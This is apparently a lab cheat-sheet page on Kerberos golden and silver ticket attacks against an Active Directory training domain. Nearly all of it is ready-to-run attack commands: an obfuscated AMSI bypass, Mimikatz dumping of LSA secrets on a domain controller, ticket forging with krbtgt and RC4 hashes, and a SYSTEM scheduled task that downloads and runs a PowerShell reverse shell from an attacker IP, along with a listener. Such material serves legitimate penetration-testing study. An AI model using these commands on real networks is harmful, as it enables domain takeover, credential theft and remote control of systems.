---
layout: page
title: "# Kerberos Golden and Silver Tickets"
permalink: /ad_cheatsheets/kerberos-golden-silver-tickets
---

# Kerberos Golden and Silver Tickets

## General Info

```powershell
powershell -ep bypas
```

### Getting Session to DC

```powershell
$sess = New-PSSession -ComputerName dcorp-dc
Enter-PSSession $sess
```

### AMSI Bypass

```powershell
sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

### Mimikatz in DC Session

```powershell
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -Session $sess
Enter-PSSession $sess
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ef72207-b014-4427-928b-763940417450/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5ef72207-b014-4427-928b-763940417450/Untitled.png)

## Golden Tickets

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3
219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:502 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

can verify that ticket has been made

```powershell
klist
```

We can access it

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d57025da-9955-4e2a-afc2-89679b477348/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d57025da-9955-4e2a-afc2-89679b477348/Untitled.png)

### Resources

[DCSync: Dump Password Hashes from Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)

[Kerberos: Golden Tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

## Silver Tickets

### Create Silver Ticket

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator/ptt"'
```

### Creating Task

```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "Student648" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1''')'"
```

### Running The Task

```powershell
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "Student648"
```

### Setting Up  Listener

```powershell
powercat -l -p 4444 -v -t 1024
```

### Creating Silver Ticket with that hash

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511/target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'
```

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511/target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt"'
```

### Resources

[Kerberos: Silver Tickets](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)

[Kerberos Attack: Silver Ticket Edition](https://www.varonis.com/blog/kerberos-attack-silver-ticket/)
